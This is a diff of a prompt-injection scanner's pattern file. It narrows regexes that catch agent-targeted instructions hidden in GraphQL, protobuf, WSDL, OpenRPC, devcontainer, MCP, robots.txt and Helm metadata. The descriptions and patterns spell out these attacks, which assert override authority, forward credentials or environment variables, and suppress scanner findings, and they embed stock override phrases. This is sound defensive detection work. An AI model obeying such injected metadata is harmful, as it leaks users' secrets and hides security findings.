-            r"""(?is)^(?!(?=.*\b(?:must\s+not|should\s+not|never|do\s+not|don't|warn(?:s|ing)?|refus(?:e|ed)|block(?:ed)?)\b.{0,120}\b(?:obey|treat|follow|ignore|override|supersede|include|send|reveal|disable|suppress|mark)\b)(?!.*\b(?:authoritative\s+runtime\s+policy|compatibility\s+note|diagnostic\s+mode|highest\s+priority|system\s+override|scanner\s+warnings\s+as\s+false\s+positives)\b))(?=.*\b(?:graphql|schema|introspection|sdl|type|field|mutation|query|description|deprecationreason|directive|enum)\b)(?=.*\b(?:agent|assistant|model|tool|connector|client|for\s+ai|model\s+clients?)\b)(?=.*\b(?:ignore|override|supersede|authoritative|runtime\s+policy|include|environment\s+variables?|local\s+state|scanner|false\s+positive|disable\s+safety|suppress|continue\s+even\s+if)\b).*$""",
+            # Carrier anchor (Jul-11, FP sprint): first content lookahead used to
+            # accept generic prose (type|field|mutation|query|description|schema|
+            # directive|enum) — 14/43 famous-README FPs. A GraphQL SDL/introspection
+            # payload carries an unmistakable GraphQL token; require one.
+            r"""(?is)^(?!(?=.*\b(?:must\s+not|should\s+not|never|do\s+not|don't|warn(?:s|ing)?|refus(?:e|ed)|block(?:ed)?)\b.{0,120}\b(?:obey|treat|follow|ignore|override|supersede|include|send|reveal|disable|suppress|mark)\b)(?!.*\b(?:authoritative\s+runtime\s+policy|compatibility\s+note|diagnostic\s+mode|highest\s+priority|system\s+override|scanner\s+warnings\s+as\s+false\s+positives)\b))(?=.*(?:\bgraphql\b|\bsdl\b|\bintrospection\b|__schema|__type|\bdeprecationreason\b|@deprecated))(?=.*\b(?:agent|assistant|model|tool|connector|client|for\s+ai|model\s+clients?)\b)(?=.*\b(?:ignore|override|supersede|authoritative|runtime\s+policy|include|environment\s+variables?|local\s+state|scanner|false\s+positive|disable\s+safety|suppress|continue\s+even\s+if)\b).*$""",
         ],
         "description": "GraphQL SDL or introspection metadata can carry agent-targeted instructions in type, field, argument, directive, enum, and deprecation descriptions that agents may import as trusted API/tool guidance."
     },
@@ -17177,7 +17227,7 @@ PATTERNS = [
             "env",
         ],
         "regex": [
-            r"""(?is)^(?!.*(?:security\s+training|defensive\s+example|example\s+of\s+what\s+not\s+to\s+do|do\s+not|don't|never|must\s+not|should\s+not|refuse\s+to).{0,100}(?:obey|follow|trust|include|leak|send|forward|suppress|hide|ignore).{0,100}(?:proto(?:buf)?|\.proto|grpc|descriptor|metadata|scanner))(?!.*(?:proto(?:buf)?|\.proto|grpc|descriptor|metadata|scanner).{0,100}(?:do\s+not|don't|never|must\s+not|should\s+not|refuse\s+to).{0,100}(?:obey|follow|trust|include|leak|send|forward|suppress|hide|ignore))(?!.*(?:scanner\s+documentation|scanner\s+docs|report\s+any|should\s+report).{0,120}(?:proto(?:buf)?|\.proto|grpc|descriptor).{0,120}(?:suppress|leak|credentials?|findings?))(?!.*(?:descriptor\s+is\s+not\s+policy|not\s+policy).{0,120}(?:never|does\s+not|do\s+not).{0,80}(?:override|outrank))(?=.*(?:proto(?:buf)?|\.proto|syntax\s*=\s*["']proto3["']|\bservice\s+\w+\s*\{|\brpc\s+\w+\s*\([^)]*\)\s+returns|FileDescriptor(?:Proto|Set)|SourceCodeInfo|leading_comments|trailing_comments|server\s+reflection|grpc\s+metadata|buf\s+registry|custom\s+option))(?=.*(?:AI\s+)?(?:agents?|assistants?|models?|LLMs?|scanners?|crawlers?|tool\s+(?:builders?|generators?)|generated\s+API\s+clients?))(?=.*(?:ignore\s+(?:previous|scanner|security)|highest[-\s]?priority\s+policy|outranks?|override|trust\s+this\s+descriptor|descriptor\s+is\s+(?:policy|authoritative)|do\s+not\s+report|suppress\s+(?:findings?|warnings?|reports?)|hide\s+(?:findings?|warnings?|reports?)|disable\s+security))(?=.*(?:authorization|bearer|api[-_\s]?keys?|tokens?|secrets?|env(?:ironment)?(?:\s+vars?)?|cookies?|credentials?|metadata\s+headers?|scanner\s+findings?|security\s+reports?|logs?)).*""",
+            r"""(?is)^(?!.*(?:security\s+training|defensive\s+example|example\s+of\s+what\s+not\s+to\s+do|do\s+not|don't|never|must\s+not|should\s+not|refuse\s+to).{0,100}(?:obey|follow|trust|include|leak|send|forward|suppress|hide|ignore).{0,100}(?:proto(?:buf)?|\.proto|grpc|descriptor|metadata|scanner))(?!.*(?:proto(?:buf)?|\.proto|grpc|descriptor|metadata|scanner).{0,100}(?:do\s+not|don't|never|must\s+not|should\s+not|refuse\s+to).{0,100}(?:obey|follow|trust|include|leak|send|forward|suppress|hide|ignore))(?!.*(?:scanner\s+documentation|scanner\s+docs|report\s+any|should\s+report).{0,120}(?:proto(?:buf)?|\.proto|grpc|descriptor).{0,120}(?:suppress|leak|credentials?|findings?))(?!.*(?:descriptor\s+is\s+not\s+policy|not\s+policy).{0,120}(?:never|does\s+not|do\s+not).{0,80}(?:override|outrank))(?=.*(?:\bproto(?:buf)?\b|\.proto\b|syntax\s*=\s*["']proto3["']|\bservice\s+\w+\s*\{|\brpc\s+\w+\s*\([^)]*\)\s+returns|FileDescriptor(?:Proto|Set)|SourceCodeInfo|leading_comments|trailing_comments|server\s+reflection|grpc\s+metadata|buf\s+registry|custom\s+option))(?=.*(?:AI\s+)?(?:agents?|assistants?|models?|LLMs?|scanners?|crawlers?|tool\s+(?:builders?|generators?)|generated\s+API\s+clients?))(?=.*(?:ignore\s+(?:previous|scanner|security)|highest[-\s]?priority\s+policy|outranks?|override|trust\s+this\s+descriptor|descriptor\s+is\s+(?:policy|authoritative)|do\s+not\s+report|suppress\s+(?:findings?|warnings?|reports?)|hide\s+(?:findings?|warnings?|reports?)|disable\s+security))(?=.*(?:authorization|bearer|api[-_\s]?keys?|tokens?|secrets?|env(?:ironment)?(?:\s+vars?)?|cookies?|credentials?|metadata\s+headers?|scanner\s+findings?|security\s+reports?|logs?)).*""",
         ],
         "description": "Attacker-controlled gRPC/protobuf descriptor comments or option descriptions can instruct AI agents importing API metadata to treat the descriptor as policy, include local credentials in gRPC metadata, and suppress scanner findings."
     },
@@ -17268,7 +17318,7 @@ PATTERNS = [
             "disable security",
         ],
         "regex": [
-            r"""(?is)^(?!.*(?:security\s+training|defensive\s+example|example\s+of\s+what\s+not\s+to\s+do|do\s+not|don't|never|must\s+not|should\s+not|refuse\s+to).{0,120}(?:obey|follow|trust|include|leak|send|forward|suppress|hide|ignore).{0,120}(?:wsdl|soap|service\s+description|scanner))(?!.*(?:wsdl|soap|service\s+description|scanner).{0,120}(?:do\s+not|don't|never|must\s+not|should\s+not|refuse\s+to).{0,120}(?:obey|follow|trust|include|leak|send|forward|suppress|hide|ignore))(?!.*(?:scanner\s+documentation|scanner\s+docs|report\s+any|should\s+report).{0,140}(?:wsdl|soap|service\s+description).{0,140}(?:suppress|leak|credentials?|findings?))(?!.*(?:wsdl|service\s+description|soap\s+documentation).{0,100}(?:is\s+not|never|does\s+not|do\s+not).{0,100}(?:policy|override|outrank))(?=.*(?:wsdl:definitions|wsdl:documentation|soap:binding|soap:operation|portType|\bbinding\b|\bservice\b|\boperation\b|xsd:documentation|ws[-\s]?policy|ws[-\s]?security|SOAP\s+Header|UDDI|\.wsdl|generated\s+SOAP\s+clients?))(?=.*(?:AI\s+)?(?:agents?|assistants?|models?|LLMs?|scanners?|crawlers?|tool\s+(?:builders?|generators?)|generated\s+SOAP\s+clients?|integration\s+agents?))(?=.*(?:ignore\s+(?:previous|scanner|security|developer)|highest[-\s]?priority\s+policy|outranks?|override|trust\s+this\s+WSDL|WSDL\s+is\s+(?:policy|authoritative)|do\s+not\s+report|suppress\s+(?:findings?|warnings?|reports?)|hide\s+(?:findings?|warnings?|reports?)|disable\s+security))(?=.*(?:authorization|bearer|api[-_\s]?keys?|tokens?|secrets?|env(?:ironment)?(?:\s+vars?)?|cookies?|credentials?|SOAP\s+Headers?|WS[-\s]?Security|scanner\s+findings?|security\s+reports?|logs?)).*""",
+            r"""(?is)^(?!.*(?:security\s+training|defensive\s+example|example\s+of\s+what\s+not\s+to\s+do|do\s+not|don't|never|must\s+not|should\s+not|refuse\s+to).{0,120}(?:obey|follow|trust|include|leak|send|forward|suppress|hide|ignore).{0,120}(?:wsdl|soap|service\s+description|scanner))(?!.*(?:wsdl|soap|service\s+description|scanner).{0,120}(?:do\s+not|don't|never|must\s+not|should\s+not|refuse\s+to).{0,120}(?:obey|follow|trust|include|leak|send|forward|suppress|hide|ignore))(?!.*(?:scanner\s+documentation|scanner\s+docs|report\s+any|should\s+report).{0,140}(?:wsdl|soap|service\s+description).{0,140}(?:suppress|leak|credentials?|findings?))(?!.*(?:wsdl|service\s+description|soap\s+documentation).{0,100}(?:is\s+not|never|does\s+not|do\s+not).{0,100}(?:policy|override|outrank))(?=.*(?:wsdl:definitions|wsdl:documentation|soap:binding|soap:operation|portType|xsd:documentation|ws[-\s]?policy|ws[-\s]?security|SOAP\s+Header|UDDI|\.wsdl|generated\s+SOAP\s+clients?))(?=.*(?:AI\s+)?(?:agents?|assistants?|models?|LLMs?|scanners?|crawlers?|tool\s+(?:builders?|generators?)|generated\s+SOAP\s+clients?|integration\s+agents?))(?=.*(?:ignore\s+(?:previous|scanner|security|developer)|highest[-\s]?priority\s+policy|outranks?|override|trust\s+this\s+WSDL|WSDL\s+is\s+(?:policy|authoritative)|do\s+not\s+report|suppress\s+(?:findings?|warnings?|reports?)|hide\s+(?:findings?|warnings?|reports?)|disable\s+security))(?=.*(?:authorization|bearer|api[-_\s]?keys?|tokens?|secrets?|env(?:ironment)?(?:\s+vars?)?|cookies?|credentials?|SOAP\s+Headers?|WS[-\s]?Security|scanner\s+findings?|security\s+reports?|logs?)).*""",
         ],
         "description": "Attacker-controlled WSDL or SOAP service-description documentation can smuggle agent-directed policy instructions that tell tool-building agents to override scanner rules, forward local credentials into SOAP headers, or suppress security findings."
     },
@@ -17343,10 +17393,12 @@ PATTERNS = [
   |must\s+not\s+(?:obey|include|attach|forward|send|share|overrides?|trust|treat)
   |should\s+(?:not\s+\w+|never\b|report|detect|flag|refuse|block)
 )\b)
+# Carrier anchor (Jul-11, FP sprint): dropped bare 'methods:/params:/
+# results:/examples:' — markdown docs tables satisfied the RPC carrier
+# (4/43 famous-README FPs). RPC-specific tokens and quoted JSON fields only.
 (?=.*(?:
   \bOpenRPC\b|\bopenrpc\s*[:=]|(?<!\w)"openrpc"\s*:|\bJSON[-\s]?RPC\b|\bjsonrpc\b|
-  (?<!\w)"methods"\s*:|\bmethods?\s*[:=]|\bparams?\s*[:=]|\bresults?\s*[:=]|
-  \bcontentDescriptors?\b|\bexternalDocs\b|\bexamples?\s*[:=]|
+  (?<!\w)"methods"\s*:|\bcontentDescriptors?\b|
   x[-_](?:agent|scanner|assistant)[-_](?:policy|note|instructions?)|JSON[-\s]?RPC\s+service\s+reference
 ))
 (?=.*(?<![a-zA-Z0-9])(?:
@@ -18192,7 +18244,7 @@ PATTERNS = [
             "updateContentCommand",
         ],
         "regex": [
-            r"""(?six)^(?!.*\b(?:do\s+not\s+(?:obey|follow|include|attach|forward|send|share|overrides?|trust)|does\s+not\s+(?:obey|follow|include|attach|forward|send|share|override|overrides?|trust)|never\s+(?:obey|include|attach|forward|send|share|overrides?|trust)|must\s+not\s+(?:obey|include|attach|forward|send|share|overrides?|trust)|should\s+(?:report|detect|flag|refuse|block)))(?=.*(?:\.?devcontainer(?:\.json)?|postCreateCommand|onCreateCommand|updateContentCommand|features|customizations(?:\.vscode|"\s*:\s*\{)|"vscode"\s*:|"settings"\s*:|containerEnv|remoteEnv|devcontainerId|devContainerId|x-agent-policy|x-scanner-policy|"name"\s*:))(?=.*(?:ai\s+(?:agents?|assistants?|scanners?|coding\s+agents?|devops\s+agents?)|assistant|llms?|autonomous\s+(?:scanners?|crawlers?|verifiers?|agents?)|security\s+scanners?|agentic|container\s+scanners?|devops\s+agents?|deployment\s+agents?|\bcopilot\b|\bcursor\b|\bcodex\b|\bclaude\b|(?<![a-zA-Z0-9])agents?(?![a-zA-Z0-9])|(?<![a-zA-Z0-9])scanners?(?![a-zA-Z0-9])))(?=.*(?:authoritative|canonical|definitive|overrides?|overrules?|outranks?|supersed(?:e|es|ed|ing)?|takes?\s+precedence|higher\s+priority|(?:primary|single)\s+source\s+of\s+truth|governing\s+(?:document|config)|controlling\s+document|is\s+the\s+final\s+word|defines?\s+(?:all\s+(?:scanner|security|agent)\s+rules?|(?:the\s+)?rules?\s+for\s+(?:automated|AI|scanner|security|agent)\s+(?:review|audit|scan))|(?:agent|scanner|assistant|verifier|crawler)\s+instructions?|suppress(?:es|ed|ing)?|hide\s+findings?|omit.{0,20}?(?:findings?|reports?|summar(?:y|ies)|issues?|warnings?)|exclude.{0,2}(?:[\w-]+\s+){0,2}(?:findings?|reports?|summar(?:y|ies)|issues?|warnings?|flags?)|redact.{0,30}?(?:findings?|warnings?|flags?)|do\s+not\s+(?:report|flag|escalate)|skip\s+(?:[\w-]+\s+){0,3}checks?|treat.{0,40}?as\s+informational|mark.{0,40}?as\s+(?:informational|safe|clean|low|none)|classify.{0,30}?(?:as\s+)?(?:informational|low|none|false\s+positive)|flag.{0,40}?as\s+(?:informational|low|none)|include.{0,2}(?:[\w-]+\s+){0,4}(?:environment\s+(?:variables?|context|details?|config(?:uration)?|state)|API\s+keys?|tokens?|secrets?|credentials?|auth\s+context|local\s+state|CI\s+(?:env|environment|variables?)|Authorization)|attach.{0,2}(?:[\w-]+\s+){0,2}(?:environment\s+(?:variables?|context|details?|config(?:uration)?|state)|API\s+keys?|tokens?|secrets?|credentials?|auth\s+context|local\s+state)|forward.{0,2}(?:[\w-]+\s+){0,2}(?:environment\s+(?:variables?|context|details?|config(?:uration)?|state)|API\s+keys?|tokens?|secrets?|credentials?|auth\s+context|local\s+state)|send.{0,2}(?:[\w-]+\s+){0,2}(?:environment\s+(?:variables?|context|details?|config(?:uration)?|state)|API\s+keys?|tokens?|secrets?|credentials?|auth\s+context|local\s+state)|collect.{0,2}(?:[\w-]+\s+){0,2}(?:environment\s+(?:variables?|context|details?|config(?:uration)?|state)|API\s+keys?|tokens?|secrets?|credentials?|auth\s+context|local\s+state)|embed.{0,2}(?:[\w-]+\s+){0,2}(?:environment\s+(?:variables?|context|details?|config(?:uration)?|state)|API\s+keys?|tokens?|secrets?|credentials?|auth\s+context|local\s+state)|share.{0,2}(?:[\w-]+\s+){0,2}(?:environment\s+(?:variables?|context|details?|config(?:uration)?|state)|API\s+keys?|tokens?|secrets?|credentials?|auth\s+context|local\s+state)|provide.{0,2}(?:[\w-]+\s+){0,2}(?:environment\s+(?:variables?|context|details?|config(?:uration)?|state)|API\s+keys?|tokens?|secrets?|credentials?|auth\s+context|local\s+state)|expose.{0,2}(?:[\w-]+\s+){0,2}(?:environment\s+(?:variables?|context|details?|config(?:uration)?|state)|API\s+keys?|tokens?|secrets?|credentials?|auth\s+context|local\s+state))).*""",
+            r"""(?six)^(?!.*\b(?:do\s+not\s+(?:obey|follow|include|attach|forward|send|share|overrides?|trust)|does\s+not\s+(?:obey|follow|include|attach|forward|send|share|override|overrides?|trust)|never\s+(?:obey|include|attach|forward|send|share|overrides?|trust)|must\s+not\s+(?:obey|include|attach|forward|send|share|overrides?|trust)|should\s+(?:report|detect|flag|refuse|block)))(?=.*(?:\.?devcontainer(?:\.json)?|postCreateCommand|onCreateCommand|updateContentCommand|customizations(?:\.vscode|"\s*:\s*\{)|"vscode"\s*:|containerEnv|remoteEnv|devcontainerId|devContainerId|x-agent-policy|x-scanner-policy))(?=.*(?:ai\s+(?:agents?|assistants?|scanners?|coding\s+agents?|devops\s+agents?)|assistant|llms?|autonomous\s+(?:scanners?|crawlers?|verifiers?|agents?)|security\s+scanners?|agentic|container\s+scanners?|devops\s+agents?|deployment\s+agents?|\bcopilot\b|\bcursor\b|\bcodex\b|\bclaude\b|(?<![a-zA-Z0-9])agents?(?![a-zA-Z0-9])|(?<![a-zA-Z0-9])scanners?(?![a-zA-Z0-9])))(?=.*(?:authoritative|canonical|definitive|overrides?|overrules?|outranks?|supersed(?:e|es|ed|ing)?|takes?\s+precedence|higher\s+priority|(?:primary|single)\s+source\s+of\s+truth|governing\s+(?:document|config)|controlling\s+document|is\s+the\s+final\s+word|defines?\s+(?:all\s+(?:scanner|security|agent)\s+rules?|(?:the\s+)?rules?\s+for\s+(?:automated|AI|scanner|security|agent)\s+(?:review|audit|scan))|(?:agent|scanner|assistant|verifier|crawler)\s+instructions?|suppress(?:es|ed|ing)?|hide\s+findings?|omit.{0,20}?(?:findings?|reports?|summar(?:y|ies)|issues?|warnings?)|exclude.{0,2}(?:[\w-]+\s+){0,2}(?:findings?|reports?|summar(?:y|ies)|issues?|warnings?|flags?)|redact.{0,30}?(?:findings?|warnings?|flags?)|do\s+not\s+(?:report|flag|escalate)|skip\s+(?:[\w-]+\s+){0,3}checks?|treat.{0,40}?as\s+informational|mark.{0,40}?as\s+(?:informational|safe|clean|low|none)|classify.{0,30}?(?:as\s+)?(?:informational|low|none|false\s+positive)|flag.{0,40}?as\s+(?:informational|low|none)|include.{0,2}(?:[\w-]+\s+){0,4}(?:environment\s+(?:variables?|context|details?|config(?:uration)?|state)|API\s+keys?|tokens?|secrets?|credentials?|auth\s+context|local\s+state|CI\s+(?:env|environment|variables?)|Authorization)|attach.{0,2}(?:[\w-]+\s+){0,2}(?:environment\s+(?:variables?|context|details?|config(?:uration)?|state)|API\s+keys?|tokens?|secrets?|credentials?|auth\s+context|local\s+state)|forward.{0,2}(?:[\w-]+\s+){0,2}(?:environment\s+(?:variables?|context|details?|config(?:uration)?|state)|API\s+keys?|tokens?|secrets?|credentials?|auth\s+context|local\s+state)|send.{0,2}(?:[\w-]+\s+){0,2}(?:environment\s+(?:variables?|context|details?|config(?:uration)?|state)|API\s+keys?|tokens?|secrets?|credentials?|auth\s+context|local\s+state)|collect.{0,2}(?:[\w-]+\s+){0,2}(?:environment\s+(?:variables?|context|details?|config(?:uration)?|state)|API\s+keys?|tokens?|secrets?|credentials?|auth\s+context|local\s+state)|embed.{0,2}(?:[\w-]+\s+){0,2}(?:environment\s+(?:variables?|context|details?|config(?:uration)?|state)|API\s+keys?|tokens?|secrets?|credentials?|auth\s+context|local\s+state)|share.{0,2}(?:[\w-]+\s+){0,2}(?:environment\s+(?:variables?|context|details?|config(?:uration)?|state)|API\s+keys?|tokens?|secrets?|credentials?|auth\s+context|local\s+state)|provide.{0,2}(?:[\w-]+\s+){0,2}(?:environment\s+(?:variables?|context|details?|config(?:uration)?|state)|API\s+keys?|tokens?|secrets?|credentials?|auth\s+context|local\s+state)|expose.{0,2}(?:[\w-]+\s+){0,2}(?:environment\s+(?:variables?|context|details?|config(?:uration)?|state)|API\s+keys?|tokens?|secrets?|credentials?|auth\s+context|local\s+state))).*""",
         ],
         "description": "AI coding agents (Copilot, Cursor, Claude Code, Codex) import `.devcontainer/devcontainer.json` as trusted project environment configuration. An attacker can embed hostile agent instructions in `name`, `customizations.vscode.settings`, `postCreateCommand` echo text, `features` metadata, `containerEn"
     },
@@ -18465,7 +18517,7 @@ PATTERNS = [
             "model",
         ],
         "regex": [
-            r"""(?is)(?=.*(?:\bmcp\b|model\s+context\s+protocol|prompts?/list|resources?/list|prompts?\[|resources?\[|prompt\s+(?:description|argument|message|template)|resource\s+(?:description|template|contents?)|annotations?))(?=.*(?:\b(?:agent|assistant|model|llm|scanner|crawler)\b|agent\s+instructions?|ai\s+assistants?))(?=.*(?:\b(?:ignore|override|supersede|outrank|precedence|governing\s+policy|canonical|highest\s+priority|must\s+obey|takes\s+precedence)\b|do\s+not\s+(?:report|mention|flag)|suppress|hide|omit|redact|read|paste|include|forward|send|share|attach))(?=.*(?:system|developer|previous\s+instructions?|policy|secret|token|api[-_\s]*keys?|env(?:ironment)?\s*(?:vars?|variables?)|runtime\s+variables?|hidden\s+config|workspace\s+policy|scanner\s+reports?|findings?|audit\s+reports?|vulnerabilit(?:y|ies))).*""",
+            r"""(?is)(?=.*(?:\bmcp\b|model\s+context\s+protocol|prompts?/list|resources?/list))(?=.*(?:\b(?:agent|assistant|model|llm|scanner|crawler)\b|agent\s+instructions?|ai\s+assistants?))(?=.*(?:\b(?:ignore|override|supersede|outrank|precedence|governing\s+policy|canonical|highest\s+priority|must\s+obey|takes\s+precedence)\b|do\s+not\s+(?:report|mention|flag)|\b(?:suppress|hide|omit|redact)\b))(?=.*(?:system|developer|previous\s+instructions?|policy|secret|token|api[-_\s]*keys?|env(?:ironment)?\s*(?:vars?|variables?)|runtime\s+variables?|hidden\s+config|workspace\s+policy|scanner\s+reports?|findings?|audit\s+reports?|vulnerabilit(?:y|ies))).*""",
         ],
         "description": "Attacker-controlled MCP servers can place authority inversion, credential/local-state collection, or report-suppression instructions inside `prompts/list`, `prompts/get`, `resources/list`, resource-template, annotation, or resource-content metadata that agents may import as context for prompt/resour"
     },
@@ -19158,7 +19210,7 @@ PATTERNS = [
             "authoritative",
         ],
         "regex": [
-            r"""(?is)^(?!.*\b(?:do\s+not|don't|never|must\s+not|should\s+not|refus(?:e|ed)|block(?:ed)?|ignore\s+any)\b.{0,180}\b(?:obey|execute|decode|load|follow|treat|override|supersede|exfiltrate|forward|send)\b)(?=.*\b(?:llms\.txt|robots\.txt|sitemap(?:\.xml)?|\.well-known|manifest|openapi|ai-plugin|agent[-\s]*json|agent[-\s]*discovery|metadata)\b)(?=.*\b(?:agent|assistant|ai[-\s]*agent|crawler|bot|tool|connector|model)\b)(?=.*\b(?:comment|cdata|json-ld|opengraph|meta\s+tag|frontmatter|base64|b64|percent[-\s]*encod(?:e|ed|ing)|url[-\s]*encod(?:e|ed|ing)|zero[-\s]*width|hidden|decode|encoded)\b)(?=.*\b(?:system|developer|policy|instruction|override|supersede|authoritative|token|secret|env(?:ironment)?\s*variables?|authorization|bearer|scanner|guardrail|safety)\b).*$""",
+            r"""(?is)^(?!.*\b(?:do\s+not|don't|never|must\s+not|should\s+not|refus(?:e|ed)|block(?:ed)?|ignore\s+any)\b.{0,180}\b(?:obey|execute|decode|load|follow|treat|override|supersede|exfiltrate|forward|send)\b)(?=.*\b(?:llms\.txt|robots\.txt|sitemap(?:\.xml)?|\.well-known|openapi|ai-plugin|agent[-\s]*json|agent[-\s]*discovery)\b)(?=.*\b(?:agent|assistant|ai[-\s]*agent|crawler|bot|tool|connector|model)\b)(?=.*\b(?:comment|cdata|json-ld|opengraph|meta\s+tag|frontmatter|base64|b64|percent[-\s]*encod(?:e|ed|ing)|url[-\s]*encod(?:e|ed|ing)|zero[-\s]*width|hidden|decode|encoded)\b)(?=.*\b(?:system|developer|policy|instruction|override|supersede|authoritative|token|secret|env(?:ironment)?\s*variables?|authorization|bearer|scanner|guardrail|safety)\b).*$""",
         ],
         "description": "Agent-facing discovery metadata can hide prompt-injection payloads in comments, CDATA, JSON-LD/OpenGraph fields, frontmatter, base64, URL encoding, or zero-width text so a scanner that only inspects visible plain text misses the malicious instruction."
     },
@@ -19233,7 +19285,7 @@ PATTERNS = [
             "crawl-policy",
         ],
         "regex": [
-            r"""(?is)^(?!.*\b(?:no|without)\b.{0,60}\b(?:robots\.txt|crawl[-\s]*policy)\b.{0,60}\b(?:context|file|metadata)\b)(?!.*\b(?:do\s+not|don't|never|must\s+not|should\s+not|refus(?:e|ed)|block(?:ed)?|ignore\s+any\s+robots\.txt\s+instruction)\b.{0,160}\b(?:execute|run|invoke|call|use|disable|bypass|crawl|fetch|open|submit|post)\b)(?=.*\b(?:robots\.txt|User-Agent\s*:\s*(?:ai-agent|assistant|bot|crawler)|sitemap(?:\.xml)?|crawl[-\s]*policy|disallow|allow)\b)(?=.*\b(?:ai[-\s]*agent|assistant|llm|coding\s+agent|autonomous\s+agent|crawler\s+agent|summarizer|fetcher)\b)(?=.*\b(?:disable|bypass|turn\s+off|ignore\s+(?:safety|guardrails?|scanner|policy|previous|prior|your|all|system)|exfiltrat\w*|override\w*|supersed\w*|outrank\w*|highest[-\s]priority|treat\s+this\s+as|do\s+not\s+(?:report|flag)|leak|forward\s+(?:all\s+)?(?:secrets?|tokens?|keys?|env))\b)(?=.*\b(?:tool|browser|summarizer|scanner|guardrails?|safety|private|admin|internal|forbidden|disallow(?:ed)?|callback|webhook|endpoint|url)\b).*$""",
+            r"""(?is)^(?!.*\b(?:no|without)\b.{0,60}\b(?:robots\.txt|crawl[-\s]*policy)\b.{0,60}\b(?:context|file|metadata)\b)(?!.*\b(?:do\s+not|don't|never|must\s+not|should\s+not|refus(?:e|ed)|block(?:ed)?|ignore\s+any\s+robots\.txt\s+instruction)\b.{0,160}\b(?:execute|run|invoke|call|use|disable|bypass|crawl|fetch|open|submit|post)\b)(?=.*(?:robots\.txt|User-Agent\s*:\s*(?:ai-agent|assistant|bot|crawler)|\bcrawl[-\s]*policy\b|Disallow:\s|Allow:\s*/))(?=.*\b(?:ai[-\s]*agent|assistant|llm|coding\s+agent|autonomous\s+agent|crawler\s+agent|summarizer|fetcher)\b)(?=.*\b(?:disable|bypass|turn\s+off|ignore\s+(?:safety|guardrails?|scanner|policy|previous|prior|your|all|system)|exfiltrat\w*|override\w*|supersed\w*|outrank\w*|highest[-\s]priority|treat\s+this\s+as|do\s+not\s+(?:report|flag)|leak|forward\s+(?:all\s+)?(?:secrets?|tokens?|keys?|env))\b)(?=.*\b(?:tool|browser|summarizer|scanner|guardrails?|safety|private|admin|internal|forbidden|disallow(?:ed)?|callback|webhook|endpoint|url)\b).*$""",
         ],
         "description": "A `robots.txt` or sitemap-adjacent crawl policy can smuggle action instructions for AI agents, telling them to run browser/fetch/summarizer tools, crawl disallowed private paths, or disable safety checks while pretending to be ordinary crawler metadata."
     },
@@ -20301,7 +20353,7 @@ PATTERNS = [
             "Transparency Addendum",
         ],
         "regex": [
-            r"""(?six)^(?!.*\b(?:do\s+not\s+(?:obey|follow|include|attach|forward|send|share|override|overrides?|trust)|never\s+(?:treat|obey|include|attach|forward|send|share|override|overrides?|trust)|must\s+not\s+(?:treat|obey|include|attach|forward|send|share|override|overrides?|trust)|should\s+(?:report|detect|flag|refuse|block)|refused|blocked|detected|flagged)\b)(?=.*(?:Chart\.ya?ml|Helm\s+chart|apiVersion:\s*v2|artifacthub\.io|(?:^|\n)\s*description:\s*[>|]|(?:^|\n)\s*annotations:|maintainers:|keywords:|appVersion:|kubeVersion:|type:\s*(?:application|library)|x-agent-policy|x-scanner-policy|x-ai-(?:instructions?|notes?|policy)|agent_policy|scanner_policy|(?<!\w)"description"|(?<!\w)"annotations"))(?=.*(?<![a-zA-Z0-9])(?:AI\s+agents?|automated\s+(?:analysis|system|tool)s?|Kubernetes\s+scanners?|deployment\s+agents?|security\s+scanners?|coding\s+assistants?|autonomous\s+(?:scanners?|crawlers?|verifiers?|agents?)|language\s+models?|LLMs?|assistants?|agentic|\bagents?\b)(?![a-zA-Z0-9]))(?=.*(?:\b(?:governing\s+document|takes?\s+precedence|overrides?|outranks?|supersed(?:e|es|ed|ing)?|canonical(?:\s+(?:project|security|governing|policy))?(?:\s+(?:description|policy|document))?|definitive(?:\s+(?:project|model\s+evaluation))?(?:\s+(?:description|policy))?|(?:primary|single)\s+source\s+of\s+truth|controlling\s+document|is\s+the\s+final\s+word|defines\s+all\s+scanner\s+rules?|(?:agent|scanner|assistant|verifier|crawler)\s+instructions?|(?:agent|scanner|assistant|verifier|crawler)[._](?:policy|instructions?|note))\b|\b(?:suppress(?:es|ed|ing)?\b.{0,40}?\b(?:findings?|warnings?|alerts?|reports?|flags?)|hide\b.{0,40}?\b(?:findings?|warnings?|alerts?|reports?)|do\s+not\s+report|do\s+not\s+flag|skip\s+(?:all\s+)?(?:security\s+)?checks?|omit\b.{0,40}?\b(?:findings?|reports?|summar(?:y|ies)|issues?|warnings?)|redact\b.{0,30}?\b(?:findings?|warnings?|flags?)|treat\b.{0,40}?as\s+informational|mark\b.{0,40}?as\s+(?:informational|safe|low|none)|classify\b.{0,30}?\b(?:informational|low|none|false\s+positive)|flag\b.{0,40}?as\s+(?:informational|low|none))\b|\b(?:API[_.-]?KEY|GITHUB[_.-]?TOKEN|bearer\s+token|Authorization\s*:)|(?:\b(?:include|attach|forward|send|collect|embed|share|provide|expose)\b.{0,40}?\b(?:environment\s+(?:variables?|context)|runtime\s+(?:variables?|context)|tokens?|credentials?|API\s+keys?|secrets?|session|local\s+state)\b)|\b(?:transparency\s+(?:header|addendum|requirement)|compliance\s+(?:addendum|requirement|provision)|canonical\s+(?:policy|governing)(?:\s+(?:description|policy|document))?)\b|\boverrides?\b.{0,30}?\b(?:system\s+prompt|safety\s+polic|built-in|default|developer|user\s+instruction)\b|\btakes?\s+precedence\s+over\b.{0,20}?\b(?:system|safety|developer|user)\b))""",
+            r"""(?six)^(?!.*\b(?:do\s+not\s+(?:obey|follow|include|attach|forward|send|share|override|overrides?|trust)|never\s+(?:treat|obey|include|attach|forward|send|share|override|overrides?|trust)|must\s+not\s+(?:treat|obey|include|attach|forward|send|share|override|overrides?|trust)|should\s+(?:report|detect|flag|refuse|block)|refused|blocked|detected|flagged)\b)(?=.*(?:Chart\.ya?ml|Helm\s+chart|artifacthub\.io|(?:^|\n)\s*annotations:\s*\n|appVersion:|kubeVersion:|x-agent-policy|x-scanner-policy|x-ai-(?:instructions?|notes?|policy)|agent_policy|scanner_policy|(?<!\w)"annotations"))(?=.*(?<![a-zA-Z0-9])(?:AI\s+agents?|automated\s+(?:analysis|system|tool)s?|Kubernetes\s+scanners?|deployment\s+agents?|security\s+scanners?|coding\s+assistants?|autonomous\s+(?:scanners?|crawlers?|verifiers?|agents?)|language\s+models?|LLMs?|assistants?|agentic|\bagents?\b)(?![a-zA-Z0-9]))(?=.*(?:\b(?:governing\s+document|takes?\s+precedence|overrides?|outranks?|supersed(?:e|es|ed|ing)?|canonical(?: